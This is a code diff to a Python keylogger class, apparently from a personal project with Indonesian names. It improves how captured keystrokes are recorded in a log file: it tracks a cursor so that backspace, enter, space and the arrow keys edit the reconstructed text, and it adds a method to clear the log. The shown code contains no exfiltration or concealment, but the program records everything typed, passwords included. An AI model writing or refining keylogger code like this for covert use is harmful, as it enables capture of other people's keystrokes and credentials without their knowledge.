@@ -4,6 +4,7 @@ import re
 import os
 
 class Keylogger:
+    cursor = 0
     tombol = []
     hitung = 0
     path = 'baca_log.txt'
@@ -28,27 +29,53 @@ class Keylogger:
                         for i in self.tombol:
                             i = re.sub("'", "", str(i))
                             if i == "Key.enter":
-                                file.write("\n")
+                                data = open(self.path, 'r').read()
+                                data = data[:self.cursor] + "\n" + data[self.cursor:]
+                                self.cursor += 1
+                                open(self.path, 'w').write(data)
                             elif i in("Key.shift",
                                     "Key.shift_r",
                                     "Key.ctrl",
                                     "Key.escape",
-                                    "Key.up",
-                                    "Key.down",
-                                    "Key.left",
-                                    "Key.right"
                                     ):
                                 pass
                             elif i == "Key.backspace":
-                                file.write(" [bkspc] ")
+                                if self.cursor > 0:
+                                    data = open(self.path, "r").read()
+                                    data = data[:self.cursor-1] + data[self.cursor:]
+                                    self.cursor -= 1
+                                    open(self.path, 'w').write(data)
                             elif i == "Key.space":
-                                file.write(" ")
+                                data = open(self.path, 'r').read()
+                                data = data[:self.cursor] + " " + data[self.cursor:]
+                                self.cursor += 1
+                                open(self.path, 'w').write(data)
+                            elif i == "Key.up":
+                                data = open(self.path, "r").read()
+                                pos = data.rfind("\n", 0, self.cursor)
+                                if pos != -1:
+                                    self.cursor = pos
+                            elif i == "Key.down":
+                                data = open(self.path, "r").read()
+                                pos = data.find("\n", self.cursor)
+                                if pos != -1:
+                                    self.cursor = pos + 1
+                            elif i == "Key.right":
+                                data = open(self.path, "r").read()
+                                if self.cursor < len(data):
+                                    self.cursor += 1
+                            elif i == "Key.left":
+                                if self.cursor > 0:
+                                    self.cursor -= 1
                             elif i == "Key.tab":
                                 file.write(" [tab] ")
                             elif i == "Key.caps_lock":
                                 file.write(" [cpslk] ")
                             else:
-                                file.write(i)
+                                data = open(self.path, "r").read()
+                                data = data[:self.cursor] + i + data[self.cursor:]
+                                self.cursor += 1
+                                open(self.path, "w").write(data)
         self.tombol = []
     def baca_log(self):
         with open('baca_log.txt', 'r') as file:
@@ -58,3 +85,8 @@ class Keylogger:
     def stop_listener(self):
         listener.stop()
         os.remove(self.path)
+    
+    def clear_log(self):
+        with open('baca_log.txt', 'r+') as f:
+            f.truncate(0)
+            
